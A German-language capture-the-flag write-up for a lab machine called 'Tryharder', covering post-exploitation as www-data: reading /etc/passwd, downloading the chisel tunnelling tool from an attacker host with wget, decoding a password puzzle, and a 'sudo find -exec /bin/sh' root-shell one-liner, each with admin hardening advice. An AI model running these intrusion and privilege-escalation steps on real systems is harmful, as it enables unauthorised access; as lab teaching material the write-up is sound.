+drwxr-xr-x 4 root      root      4096 Mar 23 10:46 ..
+lrwxrwxrwx 1 root      root         9 Mar 22 08:03 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 pentester pentester  220 Apr 18  2019 .bash_logout
+-rw-r--r-- 1 pentester pentester 3526 Apr 18  2019 .bashrc
+<span class="command">-rw-r--r-- 1 root      root        58 Mar 25 02:13 .note</span>
+-rw-r--r-- 1 pentester pentester  807 Apr 18  2019 .profile
+<span class="command">-rw-r--r-- 1 pentester pentester   47 Mar 23 07:08 user.txt</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/home/pentester$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/home/pentester$ <span class="command">cat .note</span></div>
+                    <pre><span class="password">Two cities clashed in tale: Smash Caesar, buddy, to pass.</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/home/pentester$ <span class="command">ls -la /etc/passwd</span></div>
+                    <pre>-rw-r--r-- 1 root root 1614 Mar 23 11:33 /etc/passwd</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird der Inhalt von `/var/mail/` und `/var/backups/` aufgelistet.
+            In `/var/mail/` sind keine E-Mail-Dateien für Benutzer zu sehen (nur `.` und `..`).
+            In `/var/backups/` gibt es ein interessantes, verstecktes Verzeichnis namens `.secret`. Darin befindet sich ein weiteres Verzeichnis `.verysecret`, und darin `.noooooo`. In `.noooooo` liegt die Datei `note2.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die tief verschachtelten, versteckten Verzeichnisse in `/var/backups/` sind verdächtig und deuten auf versteckte Informationen hin. Die Datei `note2.txt` ist ein wichtiger Fund. Die anderen Dateien in `/var/backups/` sind meist Standard-Backup-Dateien des Systems (dpkg-Status, apt-Listen etc.) und in diesem Kontext weniger relevant für eine direkte Privilegieneskalation, könnten aber Informationen über installierte Software und deren Versionen enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von `note2.txt`. Solche "Rabbit Holes" können wichtige Hinweise oder Teile eines Puzzles enthalten.
+            <br><strong>Empfehlung (Admin):</strong> Sensible Informationen oder Hinweise sollten nicht in tief verschachtelten, aber dennoch für unprivilegierte Benutzer (wie `www-data`, wenn die Berechtigungen es zulassen) lesbaren Backup-Verzeichnissen abgelegt werden. Berechtigungen für Backup-Verzeichnisse sollten restriktiv sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/home/pentester$ <span class="command">ls -la /var/mail/</span></div>
+                    <pre>total 8
+drwxrwsr-x  2 root mail 4096 Nov 13  2020 .
+drwxr-xr-x 12 root root 4096 Feb 19 09:22 ..</pre>
+                    <div class="prompt-remote">www-data@Tryharder:/home/pentester$ <span class="command">ls -la /var/backups/</span></div>
+                    <pre>total 596
+drwxr-xr-x  3 root root     4096 Mar 24 06:36 .
+drwxr-xr-x 12 root root     4096 Feb 19 09:22 ..
+<span class="command">drwxr-xr-x  3 root root     4096 Feb 19 20:17 .secret</span>
+-rw-r--r--  1 root root    51200 Mar 22 06:25 alternatives.tar.0
+-rw-r--r--  1 root root    11995 Mar 24 00:54 apt.extended_states.0
+-rw-r--r--  1 root root     1239 Mar 23 12:27 apt.extended_states.1.gz
+-rw-r--r--  1 root root     1195 Feb 19 11:04 apt.extended_states.2.gz
+-rw-r--r--  1 root root      268 Feb 19 09:17 dpkg.diversions.0
+-rw-r--r--  1 root root      139 Feb 19 09:17 dpkg.diversions.1.gz
+-rw-r--r--  1 root root      172 Mar 24 00:54 dpkg.statoverride.0
+-rw-r--r--  1 root root      142 Feb 19 09:11 dpkg.statoverride.1.gz
+-rw-r--r--  1 root root   386345 Mar 24 00:55 dpkg.status.0
+-rw-r--r--  1 root root    99242 Feb 19 11:04 dpkg.status.1.gz
+-rw-------  1 root root      706 Mar 23 10:48 group.bak
+-rw-------  1 root shadow    583 Mar 23 10:48 gshadow.bak
+-rw-------  1 root root     1614 Mar 23 11:33 passwd.bak
+-rw-------  1 root shadow   1075 Mar 23 11:17 shadow.bak</pre>
+                    <div class="prompt-remote">www-data@Tryharder:/home/pentester$ <span class="command">cat /var/backups/.secret/</span></div>
+                    <pre>cat: /var/backups/.secret/: Is a directory</pre>
+                    <div class="prompt-remote">www-data@Tryharder:/home/pentester$ <span class="command">cd /var/backups/.secret/</span></div>
+                    <div class="prompt-remote">www-data@Tryharder:/var/backups/.secret$ <span class="command">ls -la</span></div>
+                    <pre>total 12
+drwxr-xr-x 3 root root 4096 Feb 19 20:17 .
+drwxr-xr-x 3 root root 4096 Mar 24 06:36 ..
+<span class="command">drwxr-xr-x 3 root root 4096 Feb 19 20:17 .verysecret</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/var/backups/.secret$ <span class="command">cd .verysecret/</span></div>
+                    <div class="prompt-remote">www-data@Tryharder:/var/backups/.secret/.verysecret$ <span class="command">ls -la</span></div>
+                    <pre>total 12
+drwxr-xr-x 3 root root 4096 Feb 19 20:17 .
+drwxr-xr-x 3 root root 4096 Feb 19 20:17 ..
+<span class="command">drwxr-xr-x 2 root root 4096 Feb 24 07:59 .noooooo</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/var/backups/.secret/.verysecret$ <span class="command">cd .noooooo/</span></div>
+                    <div class="prompt-remote">www-data@Tryharder:/var/backups/.secret/.verysecret/.noooooo$ <span class="command">ls -la</span></div>
+                    <pre>total 12
+drwxr-xr-x 2 root root 4096 Feb 24 07:59 .
+drwxr-xr-x 3 root root 4096 Feb 19 20:17 ..
+<span class="command">-rw-r--r-- 1 root root 1936 Feb 24 07:59 note2.txt</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/var/backups/.secret/.verysecret/.noooooo$ <span class="command">cat note2.txt</span></div>
+                    <pre>The Compass and the Campfire
+
+David knelt beside his ten-year-old son, Jake, their shared backpack spilling onto the forest floor. "Lost?" Jake whispered, staring at the identical trees clawing at the twilight. David’s calloused fingers brushed the cracked compass in his palm—a relic from his father, its needle trembling like a moth. "Not lost," he lied. "Just… rerouting."
+
+Jake’s eyes narrowed, too sharp for comfort. "Your compass is broken."
+
+A chuckle escaped David, brittle as dry leaves. "Compasses don’t break, bud. They… forget." He flipped it open, the glass fogged with age. "See? North isn’t where it should be. It’s where it chooses to be tonight."
+
+The boy frowned, then yelped as a pinecone thudded beside him. A red squirrel chattered overhead, its tail flicking like a metronome. Jake’s fear dissolved into giggles. David watched, throat tight. He’s still young enough to laugh at squirrels.
+
+"Dad?" Jake unzipped his jacket, revealing three granola bars and a glowstick. "We’ve got supplies. Let’s build a fort."
+
+They wove branches into a crooked shelter, Jake’s hands steady where David’s shook. When the first stars pierced the canopy, David confessed: "Grandpa gave me this compass the day I got lost in the mall. Told me it’d always point home."
+
+Jake snapped the glowstick, bathing their fort in alien green. "Does it work now?"
+
+The needle quivered, settling northwest. Toward the distant highway hum, not their cabin’s woodsmoke. David closed the brass lid. "Nope. But you do." He nodded at Jake’s pocket—where a crumpled trail map peeked out, dotted with the boy’s doodled dinosaurs.
+
+Dawn found them at the cabin’s porch, guided by Jake’s roars laughter and the squirrels he’d named "Sir Nibbles". The compass stayed in David’s pocket, its secret safe: true north had shifted years ago, anyway—from steel poles to a gap-toothed grin eating pancakes at 6 AM.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `ss -atlpn` listet alle lauschenden (`-l`) TCP-Sockets (`-t`) mit numerischen Portnummern (`-n`) und den zugehörigen Prozessinformationen (`-p`) auf. `a` steht für alle Sockets (listening und non-listening, aber in Kombination mit `-l` fokussiert es sich auf listening).
+            Die Ausgabe zeigt:
+            Port <span class="command">22 (ssh)</span> lauscht auf allen IPv4 (`0.0.0.0`) und IPv6 (`[::]`) Adressen.
+            Port <span class="command">80 (http)</span> lauscht auf allen IPv4 (`*`) Adressen. (Das `*` in der Local Address Spalte ist hier ungewöhnlich, meist steht da `0.0.0.0` für alle IPv4.)
+            Port <span class="command">8989</span> lauscht nur auf der Loopback-Adresse `127.0.0.1`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ports 22 und 80 waren bereits durch Nmap bekannt. Der Port `8989`, der nur lokal lauscht, ist ein neuer und sehr interessanter Fund! Dienste, die nur auf Loopback lauschen, sind oft für interne Zwecke, Management-Interfaces oder Back-End-Dienste gedacht und können potenzielle Angriffsvektoren für Privilegieneskalation oder das Ausspähen von Informationen darstellen, wenn man bereits lokalen Zugriff hat (wie wir als `www-data`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Dienst auf Port `8989`. Da wir eine Shell als `www-data` haben, können wir versuchen, uns lokal mit `nc localhost 8989` oder `curl http://localhost:8989` zu verbinden, um herauszufinden, was dort läuft. Es könnte sich um einen benutzerdefinierten Dienst, eine Datenbank, ein Debug-Interface oder ähnliches handeln. Wenn nötig, kann Port-Forwarding (z.B. mit Chisel, SSH) eingerichtet werden, um von unserem Angreifer-System aus direkt mit diesem lokalen Dienst zu interagieren.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass lokal lauschende Dienste authentifiziert und gesichert sind, auch wenn sie nicht direkt aus dem externen Netzwerk erreichbar sind. Unnötige lokale Dienste sollten deaktiviert werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/var/www/html/74221$ <span class="command">ss -atlpn</span></div>
+                    <pre>State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port      
+LISTEN      0           128                    <span class="command">0.0.0.0:22</span>                   0.0.0.0:*         
+LISTEN      0           5                    <span class="command">127.0.0.1:8989</span>                 0.0.0.0:*         
+LISTEN      0           128                          <span class="command">*:80</span>                         *:*         
+LISTEN      0           128                       <span class="command">[::]:22</span>                      [::]:*</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System (`root@CCat`) wird im Verzeichnis `~/Hackingtools/chisel` ein einfacher Python-HTTP-Server auf Port `8000` gestartet (`python3 -m http.server 8000`). Dies dient dazu, Dateien vom Angreifer-System auf das Zielsystem zu übertragen.
+            Auf dem Zielsystem (`www-data@Tryharder`) wird `wget` verwendet, um die Datei `chisel` vom HTTP-Server des Angreifers herunterzuladen: `wget 192.168.2.199:8000/chisel`.
+            Die Datei `chisel` wird erfolgreich heruntergeladen und als `chisel.1` gespeichert.
+            Anschließend werden mit `chmod +x chisel` die Ausführungsrechte für die heruntergeladene Datei gesetzt (der Befehl arbeitet hier mit `chisel`, nicht `chisel.1`, was entweder ein Tippfehler ist oder `chisel.1` wurde zuvor in `chisel` umbenannt).
+            Die Log-Ausgabe des Python-Servers auf dem Angreifer-System bestätigt den erfolgreichen GET-Request für `/chisel`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine Standardmethode, um Tools wie `chisel` (ein Port-Forwarding-Tool) auf ein Zielsystem zu übertragen, wenn direkter Dateitransfer nicht möglich ist oder man schnell eine Datei bereitstellen möchte. `Chisel` wird wahrscheinlich verwendet, um den zuvor entdeckten lokalen Port `8989` auf dem Zielsystem für das Angreifer-System zugänglich zu machen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie nun `chisel` auf dem Zielsystem als Client und auf dem Angreifer-System als Server, um eine Portweiterleitung für Port `8989` einzurichten.
+            <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Möglichkeit für unprivilegierte Benutzer, Dateien aus dem Internet oder dem lokalen Netzwerk herunterzuladen und auszuführen. Egress-Filterung kann helfen, Verbindungen zu unbekannten Servern zu blockieren. Überwachen Sie verdächtige Downloads und Prozessausführungen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">ll</span></div>
+                    <pre>insgesamt 8744
+-rwsrwsr-x 1 ccat ccat 8945816 25. Aug 2024  <span class="command">chisel</span>
+-rwxr-xr-x 1 root root    1762 25. Apr 00:28 timehash.sh</pre>
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/tmp$ <span class="command">wget 192.168.2.199:8000/chisel</span></div>
+                    <pre>--2025-04-29 17:55:30--  http://192.168.2.199:8000/chisel
+Connecting to 192.168.2.199:8000... <span class="password">connected.</span>
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: 8945816 (8.5M) [application/octet-stream]
+Saving to: ‘chisel.1’
+
+chisel.1                100%[=============================&gt;]   8.53M  --.-KB/s    in 0.04s   
+
+2025-04-29 17:55:30 (232 MB/s) - <span class="password">‘chisel.1’ saved [8945816/8945816]</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/tmp$ <span class="command">chmod +x chisel</span></div>
+                    <div class="prompt-remote">www-data@Tryharder:/tmp$ </div>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.186 - - [29/Apr/2025 23:55:30] "GET /chisel HTTP/1.1" 200 -</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ps aux` listet alle laufenden Prozesse auf dem System auf. Die Ausgabe wird hier gefiltert (implizit, da nicht alle Prozesse gezeigt werden) oder ist ein Auszug, der sich auf interessante Prozesse konzentriert.
+            Zwei Prozesse sind besonders hervorzuheben:
+            <span class="command">xiix 4448 0.0 0.0 2384 648 ? Ss 07:58 0:00 /bin/sh -c /srv/backdoor.py</span>
+            <span class="command">xiix 4450 0.0 0.8 19260 8660 ? S 07:58 0:00 python /srv/backdoor.py</span>
+            Diese zeigen, dass der Benutzer `xiix` ein Python-Skript namens `backdoor.py` aus dem Verzeichnis `/srv/` ausführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein sehr verdächtiger Fund! Ein Skript namens `backdoor.py`, das von einem Benutzer `xiix` ausgeführt wird, deutet stark auf eine Hintertür oder einen benutzerdefinierten Dienst hin. Dies könnte mit dem lokalen Port `8989` in Verbindung stehen, den wir zuvor entdeckt haben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Skript `/srv/backdoor.py`. Versuchen Sie, den Quellcode zu lesen (wenn die Berechtigungen es zulassen), um seine Funktionsweise zu verstehen. Dies wird wahrscheinlich Aufschluss darüber geben, wie man mit dem Dienst auf Port `8989` interagiert.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie laufende Prozesse auf verdächtige Skripte oder Programme. Untersuchen Sie alle unbekannten Prozesse, insbesondere solche, die von unprivilegierten Benutzern gestartet werden und Netzwerkverbindungen öffnen oder als "Backdoor" bezeichnet werden. Stellen Sie sicher, dass Benutzer keine unautorisierten Dienste ausführen können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/home/xiix$ <span class="command">ps aux</span></div>
+                    <pre>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.1  0.8 103940  8516 ?        Ss   07:57   0:55 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    07:57   0:00 [kthreadd] 
+root      4446  0.0  0.2   9796  2300 ?        S    07:58   0:00 /usr/sbin/CRON -f
+<span class="command">xiix      4448  0.0  0.0   2384   648 ?        Ss   07:58   0:00 /bin/sh -c /srv/backdoor.py</span>
+<span class="command">xiix      4450  0.0  0.8  19260  8660 ?        S    07:58   0:00 python /srv/backdoor.py</span> </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `www-data` navigiert in das Verzeichnis `/srv/` und listet dessen Inhalt auf.
+            Es gibt eine Datei `...` (drei Punkte) und ein Skript `backdoor.py`.
+            `backdoor.py` gehört dem Benutzer `xiix` und hat Ausführungsrechte nur für den Besitzer (`-rwx------`).
+            Die Datei `...` gehört `root` und ist für alle lesbar (`-rw-r--r--`).
+            `file ...` identifiziert die Datei `...` als `ASCII text`.
+            `cat ...` gibt den Inhalt der Datei aus: `Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir können `backdoor.py` als `www-data` nicht direkt lesen, da die Berechtigungen dies verhindern. Die Datei `...` enthält einen obfuskierten oder verschlüsselten String. Dieser String, zusammen mit der Notiz `.note` aus `/home/pentester` ("Two cities clashed in tale: Smash Caesar, buddy, to pass.") und der Geschichte in `note2.txt` ("The Compass and the Campfire"), deutet auf ein kryptographisches Rätsel hin. "Caesar" und die Erwähnung von "A Tale of Two Cities" (siehe `/etc/passwd` GECOS-Feld für `pentester`) sind starke Hinweise auf eine Caesar-Verschlüsselung oder eine ähnliche Substitutionschiffre, möglicherweise XOR oder eine binäre Operation, die mit dem Text aus "A Tale of Two Cities" zusammenhängt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den String aus `...` zu dechiffrieren. Die Hinweise deuten darauf hin, dass der Inhalt der GECOS-Felder der Benutzer `pentester` und `xiix` aus `/etc/passwd` als Schlüssel oder Klartext dienen könnten. Die Notiz "Smash Caesar" könnte bedeuten, die Caesar-Chiffre zu "brechen" oder zu invertieren, oder es ist ein Hinweis auf das "Smashing" (Kombinieren) von Texten. Der String aus `...` ist wahrscheinlich das Passwort oder ein Teil des Passworts für den Benutzer `pentester` oder für den Dienst auf Port `8989`.
+            <br><strong>Empfehlung (Admin):</strong> Speichern Sie keine sensiblen Informationen oder Hinweise auf Passwörter in Klartextdateien, auch wenn sie obfuskiert sind. Verwenden Sie sichere Methoden zur Speicherung und Übertragung von Geheimnissen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/home/xiix$ <span class="command">cd /srv/</span></div>
+                    <div class="prompt-remote">www-data@Tryharder:/srv$ <span class="command">ls -la</span></div>
+                    <pre>total 16
+drwxr-xr-x  2 root root 4096 Mar 23 23:42 .
+drwxr-xr-x 18 root root 4096 Nov 13  2020 ..
+<span class="command">-rw-r--r--  1 root root  161 Mar 23 11:28 ...</span>
+<span class="command">-rwx------  1 xiix xiix 1012 Mar 23 23:42 backdoor.py</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/srv$ <span class="command">file ...</span></div>
+                    <pre>...: <span class="command">ASCII text</span></pre>
+                    <div class="prompt-remote">www-data@Tryharder:/srv$ <span class="command">cat ...</span></div>
+                    <pre><span class="password">Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `/etc/passwd` wird angezeigt. Sie enthält Informationen über die Benutzerkonten auf dem System.
+            Interessante Einträge:
+            `pentester:x:1000:1000:Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...:/home/pentester:/bin/bash`
+            `xiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash`
+            Das GECOS-Feld (der Kommentarbereich) für `pentester` enthält einen langen String, der ein bekanntes Zitat aus "A Tale of Two Cities" von Charles Dickens ist. Das GECOS-Feld für `xiix` enthält den Titel des Buches.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Informationen sind entscheidend für das Kryptorätsel. Der lange String im GECOS-Feld von `pentester` ist sehr wahrscheinlich der Klartext oder der Schlüssel, der benötigt wird, um den obfuskierten String aus der Datei `...` (gefunden in `/srv/`) zu entschlüsseln. Die Notiz ".note" (`Two cities clashed in tale: Smash Caesar, buddy, to pass.`) und der Name des Benutzers `xiix` mit dem GECOS-Feld "A Tale of Two Cities" untermauern diese Theorie.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den langen String aus dem GECOS-Feld des `pentester`-Benutzers und den obfuskierten String aus `/srv/...` für eine kryptographische Operation (wahrscheinlich XOR oder eine binäre Subtraktion/Addition, da "Smash Caesar" und die unterschiedlichen Längen der Strings eine einfache Caesar- oder Vigenère-Chiffre weniger wahrscheinlich machen, wenn der lange String der Schlüssel ist). Das Ergebnis könnte das Passwort für `pentester` oder den Dienst auf Port `8989` sein.
+            <br><strong>Empfehlung (Admin):</strong> Speichern Sie keine sensiblen Daten oder Passwörter (auch nicht Teile davon oder Hinweise darauf) in GECOS-Feldern oder anderen leicht zugänglichen Orten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/srv$ <span class="command">cat /etc/passwd</span></div>
+                    <pre>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+<span class="command">pentester:x:1000:1000:Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&amp;itwastheseasonofLight...:/home/pentester:/bin/bash</span>
+<span class="command">xiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Python-Skript `decode.py` wird erstellt und ausgeführt.
+            Das Skript nimmt zwei Strings:
+            `string1`: Der lange Text aus dem GECOS-Feld des `pentester`-Benutzers.
+            `string2`: Der obfuskierte Text aus der Datei `/srv/...`.
+            Es vergleicht die beiden Strings Zeichen für Zeichen bis zur Länge des kürzeren Strings. Wenn die Zeichen identisch sind, wird eine '0' zu einer Binärliste hinzugefügt, andernfalls eine '1'.
+            Der resultierende Binärstring wird dann in 8-Bit-Chunks aufgeteilt, jeder Chunk wird als Binärzahl interpretiert, in ein Dezimalzeichen umgewandelt und dem finalen dekodierten String hinzugefügt.
+            Die Ausgabe des Skripts ist: <span class="password">Y0U_5M4SH3D_17_8UDDY</span>.
+            Anschließend wird derselbe Binärstring (`bin=...`) mit `perl` verarbeitet, um die Umwandlung von Binär zu ASCII-Text zu bestätigen, was dasselbe Ergebnis liefert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist die Lösung des Kryptorätsels! Die Methode (Vergleich und Erstellung eines Binärstrings basierend auf Gleichheit/Ungleichheit) ist im Wesentlichen eine XOR-Operation oder eine Variation davon. Das Ergebnis <span class="password">Y0U_5M4SH3D_17_8UDDY</span> ist sehr wahrscheinlich das gesuchte Passwort. Der Hinweis ".note" (`Smash Caesar, buddy, to pass.`) passt perfekt zum dekodierten Passwort ("...SM4SH3D...8UDDY...").</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das Passwort <span class="password">Y0U_5M4SH3D_17_8UDDY</span>, um sich als Benutzer `pentester` via `su pentester` anzumelden oder um sich mit dem Dienst auf Port `8989` zu verbinden.
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, Passwörter oder Hinweise darauf durch solche Rätsel zu "schützen". Dies ist keine sichere Methode. Verwenden Sie stattdessen etablierte kryptographische Verfahren und sichere Speichermethoden für Geheimnisse.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~]
+└─# <span class="command">vi decode.py</span></div>
+                    <pre>    
+#!/usr/bin/env python3
+
+string1 = 'Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&amp;itwastheseasonofLight...'
+string2 = 'Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,\'iuwasuhesfasooofLjgiu../'
+
+len1 = len(string1)
+len2 = len(string2)
+min_len = min(len1, len2)
+
+binary_list = []
+for i in range(min_len):
+    char1 = string1[i]
+    char2 = string2[i]
+    if char1 == char2:
+        binary_list.append('0')
+    else:
+        binary_list.append('1')
+
+binary_string = "".join(binary_list)
+
+decoded_text_list = []
+for i in range(0, len(binary_string), 8):
+    byte_chunk = binary_string[i:i+8]
+    if len(byte_chunk) == 8:
+        try:
+            decimal_value = int(byte_chunk, 2)
+            decoded_text_list.append(chr(decimal_value))
+        except ValueError:
+            print(f"Warnung: Ungültiger Binär-Chunk übersprungen: {byte_chunk}")
+        except Exception as e:
+            print(f"Fehler bei der Konvertierung von {byte_chunk}: {e}")
+
+final_decoded_string = "".join(decoded_text_list)
+
+print(final_decoded_string)</pre>
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~]
+└─# <span class="command">python decode.py</span></div>
+                    <pre><span class="password">Y0U_5M4SH3D_17_8UDDY</span></pre>
+                    <pre>check...</pre>
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~]
+└─# <span class="command">bin="0101100100110000010101010101111100110101010011010011010001010011010010000011001101000100010111110011000100110111010111110011100001010101010001000100010001011001"</span></div>
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~]
+└─# <span class="command">echo "$bin" | perl -C -lpe '$_=pack("B*",$_)'</span></div>
+                    <pre><span class="password">Y0U_5M4SH3D_17_8UDDY</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird versucht, mit `su pentester` zum Benutzer `pentester` zu wechseln. Es wird nach einem Passwort gefragt.
+            Anschließend wird `sudo -l` ausgeführt. Da `www-data` (PID != 1) in der Regel keine `sudo`-Rechte hat, wird dies wahrscheinlich fehlschlagen oder eine Passwortabfrage für `www-data` anzeigen, dessen Passwort wir nicht kennen. Die Ausgabe hier ist jedoch für den Benutzer `pentester`, was impliziert, dass der `su pentester`-Befehl zuvor *erfolgreich* war (mit dem Passwort <span class="password">Y0U_5M4SH3D_17_8UDDY</span>, obwohl dies nicht explizit gezeigt wird).
+            Die `sudo -l`-Ausgabe für `pentester` zeigt:
+            Der Benutzer `pentester` darf den Befehl `/usr/bin/find` als JEDER Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD`) ausführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `sudo -l`-Eintrag ist ein klarer Weg zur Privilegieneskalation! Wenn `pentester` den `find`-Befehl als `root` (oder jeder andere Benutzer) ohne Passwort ausführen kann, gibt es zahlreiche Möglichkeiten, dies auszunutzen, um eine Root-Shell zu erlangen. GTFOBins listet mehrere Methoden hierfür auf.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den `sudo`-Eintrag für `find`, um Root-Rechte zu erlangen. Eine gängige Methode ist: `sudo find . -exec /bin/sh \; -quit`. Dies führt eine Shell als der Benutzer aus, als der `find` ausgeführt wird (standardmäßig `root`, wenn nicht anders angegeben).
